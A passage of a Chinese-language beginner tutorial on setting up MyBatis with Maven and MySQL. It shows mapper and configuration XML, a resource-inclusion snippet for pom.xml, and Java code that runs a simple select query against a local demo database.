class="hljs-string">&quot;alluser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;</span><br>        select * from test;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>SQL映射文件：用来写SQL语句的。MyBatis会执行这些SQL。<br>其中，</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span></span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">  <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>这个是指定约束文件。<code>mybatis-3-mapper.dtd</code> 是约束文件的名称。约束文件用来限制和检查在当前文件中出现的标签、属性是否符合MyBatis的要求。</p><p><code>mapper</code>：是当前文件的根标签，且是必须的。<br><code>namespace</code>：是命名空间，唯一值，可以是自定义的字符串，但必须是使用 dao 接口的全限定名称。如：com.loong.dao.USERDao</p><p><code>&lt;select&gt; </code>：执行查询语句。<br><code>&lt;update&gt;</code>：更新数据库操作。<br><code>&lt;insert&gt;</code>：插入。<br><code>&lt;delete&gt;</code>：删除。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;alluser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;</span><br>        select * from test;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><code>id</code>：要执行的SQL语句的唯一标识，MyBatis会使用这个id的值来找到要执行的SQL语句。可以自定义，但是要求使用接口中的方法名称。<br><code>resultType</code>：表示结果类型。是SQL语句执行后得到 ResultSet ，遍历这个 ResultSet 得到 Java 对象的类型。值是类型的全限定名称。</p><h2 id="6-数据库连接"><a href="#6-数据库连接" class="headerlink" title="6.数据库连接"></a>6.数据库连接</h2><p>在<code>resources</code>中新建 <code>mybatis.xml</code> 文件。</p><p>mybatis.xml;</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/teamc?useSSL=false <span class="hljs-symbol">&amp;amp;</span> serverTimezone=UTC&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;loong&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;com/loong/Dao/MybatisStudyDao.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>mybatis 的主配置文件：主要定义了数据库的配置信息，SQL映射文件的位置。</p><p>约束文件。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">  <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><code>configuration</code> ：是根标签。<br><code>environments</code>：是环境配置，就是数据库的连接信息。default 表示默认连接哪一个数据库，必须和某个 environment 的 id 值一样，告诉mybatis使用哪一个数据库的连接信息。<br><code>environment</code>：一个数据库信息的配置。id 是表示环境的名称<br><code>transactionManager</code>：表示事务的类型。 type ：jdbc（表示使用jdbc中的Connection对象的commit、rollback做事务处理。）<br><code>dataSource</code>：表示数据源，用来连接数据库的。type 表示数据源的类型，而 pooled 表示使用连接池。<br><code>property</code>：表示数据库的具体信息。</p><p>实例：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">  <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/teamc&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;12345&quot;</span>/&gt;</span> //密码<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;com/loong/dao/USERDao.xml&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>其中的 mappers 中写sql映射文件的位置。<br>一个mapper标签指定一个文件的位置。从类路径开始的路径信息（target/classes），其中classes就是类路径。这里的 target 文件需要在编译后才能看到。<br>在右侧的 Maven中， Lifecycle -&gt; compile 。</p><p>但在默认情况下，target 中没有xml 文件。需要安装maven插件（也可以不用安装）。</p><p>在 <code>pom.xml</code>文件的 <code>build</code>中添加如下代码。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><span class="hljs-comment">&lt;!--所在的目录--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><span class="hljs-comment">&lt;!--包括目录下的 .properties.xml 文件都会扫描到--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>加好之后，可以 Rload project ，再编译一遍。</p><h2 id="7-运行"><a href="#7-运行" class="headerlink" title="7.运行"></a>7.运行</h2><p>在main 下的 loong 目录下新建一个 java文件。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><br>        String config = <span class="hljs-string">&quot;mybatis.xml&quot;</span>;<br>        InputStream in = Resources.getResourceAsStream(config);<br>        SqlSessionFactoryBuilder builder = <span class="hljs-keyword">new</span> SqlSessionFactoryBuilder();<br>        SqlSessionFactory factory = builder.build(in);<br>        SqlSession sqlsession = factory.openSession();<br>        String sqlid = <span class="hljs-string">&quot;com.loong.Dao.MybatisStudyDao&quot;</span>+<span class="hljs-string">&quot;.&quot;</span>+<span class="hljs-string">&quot;alluser&quot;</span>;<br>    <span class="hljs-comment">//  String sqlid = &quot;com.loong.Dao.MybatisStudyDao.alluser&quot;;</span><br>        List&lt;USER&gt; us = sqlsession.selectList(sqlid);<br>        us.forEach(stu-&gt;System.out.println(stu));<br>        sqlsession.close();<br><br>    &#125;<br></code></pre></div></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><h2 id="1-项目目录"><a href="#1-项目目录" class="headerlink" title="1.项目目录"></a>1.项目目录</h2><p><img src="https://img-blog.csdnimg.cn/20210613132526362.png"></p><h2 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a>2.代码实现</h2><h3 id="1-1-MyBatisStudyDao（接口）"><a href="#1-1-MyBatisStudyDao（接口）" class="headerlink" title="1.1 MyBatisStudyDao（接口）"></a>1.1 MyBatisStudyDao（接口）</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.Dao;<br><br><span class="hljs-keyword">import</span> com.loong.test.USER;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">MybatisStudyDao</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;USER&gt; <span class="hljs-title">alluser</span><span class="hljs-params">()</span></span>;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="1-2-MyBatisStudyDao-xml"><a href="#1-2-MyBatisStudyDao-xml" class="headerlink" title="1.2 MyBatisStudyDao.xml"></a>1.2 MyBatisStudyDao.xml</h3><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;<br>&lt;!DOCTYPE mapper<br>        PUBLIC <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span><br>        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;<br>&lt;mapper namespace=<span class="hljs-string">&quot;com.loong.Dao.MybatisStudyDao&quot;</span>&gt;<br>&lt;!--    &lt;select id=<span class="hljs-string">&quot;selectBlog&quot;</span> resultType=<span class="hljs-string">&quot;Blog&quot;</span>&gt;--&gt;<br>&lt;!--        select * from Blog where id = #&#123;id&#125;--&gt;<br>&lt;!--    &lt;/select&gt;--&gt;<br><br>    &lt;select id=<span class="hljs-string">&quot;alluser&quot;</span> resultType=<span class="hljs-string">&quot;com.loong.test.USER&quot;</span>&gt;<br>        select * from test;<br>    &lt;/select&gt;<br>&lt;/mapper&gt;<br></code></pre></div></td></tr></table></figure><h3 id="2-1-USER"><a href="#2-1-USER" class="headerlink" title="2.1 USER"></a>2.1 USER</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">USER</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String tele;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(Integer id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTele</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> tele;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTele</span><span class="hljs-params">(String tele)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.tele = tele;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;USER&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, username=&#x27;&quot;</span> + username + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, tele=&#x27;&quot;</span> + tele + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-1-myapp"><a href="#3-1-myapp" class="headerlink" title="3.1 myapp"></a>3.1 myapp</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong;<br><br><span class="hljs-keyword">import</span> com.loong.test.USER;<br><span class="hljs-keyword">import</span> org.apache.ibatis.io.Resources;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myapp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><br>        String config = <span class="hljs-string">&quot;mybatis.xml&quot;</span>;<br>        InputStream in = Resources.getResourceAsStream(config);<br>        SqlSessionFactoryBuilder builder = <span class="hljs-keyword">new</span> SqlSessionFactoryBuilder();<br>        SqlSessionFactory factory = builder.build(in);<br>        SqlSession sqlsession = factory.openSession();<br>       <span class="hljs-comment">// String sqlid = &quot;com.loong.Dao.MybatisStudyDao&quot;+&quot;.&quot;+&quot;alluser&quot;;</span><br>        String sqlid = <span class="hljs-string">&quot;com.loong.Dao.MybatisStudyDao.alluser&quot;</span>;<br>        List&lt;USER&gt; us = sqlsession.selectList(sqlid);<br>        us.forEach(stu-&gt;System.out.println(stu));<br>        sqlsession.close();<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-1-mybatis-xml"><a href="#4-1-mybatis-xml" class="headerlink" title="4.1 mybatis.xml"></a>4.1 mybatis.xml</h3><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/teamc?useSSL=false <span class="hljs-symbol">&amp;amp;</span> serverTimezone=UTC&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;loong&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;com/loong/Dao/MybatisStudyDao.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-1-pom-xml"><a href="#5-1-pom-xml" class="headerlink" title="5.1 pom.xml"></a>5.1 pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 